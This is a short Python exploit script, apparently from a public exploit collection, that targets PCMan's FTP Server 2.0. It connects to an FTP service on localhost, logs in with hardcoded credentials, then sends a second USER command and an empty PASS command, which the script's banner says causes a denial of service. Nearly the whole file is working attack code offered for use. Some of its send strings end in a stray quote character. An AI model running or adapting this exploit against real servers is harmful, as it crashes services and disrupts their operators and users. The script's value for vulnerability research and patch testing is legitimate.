#!/usr/bin/python

import socket
import sys

USER="chako"
PASSWD="chako"

print("\n\n[+] PCMan's FTP Server 2.0 Empty Password Denial of Service")
print("[+] Version: V2.0")
print("[+] Chako\n\n\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1",21))
data = s.recv(1024)


print("[-] Login to FTP Server...\n")
s.send("USER " + USER + '\r\n')
data = s.recv(1024)
s.send("PASS " + PASSWD + '\r\n')
data = s.recv(1024)



print("[-] Sending exploit...\n")
s.send("USER TEST\r\n'")
s.send("PASS \r\n'")
s.close()

print("[!] Done! Exploit successfully sent\n")


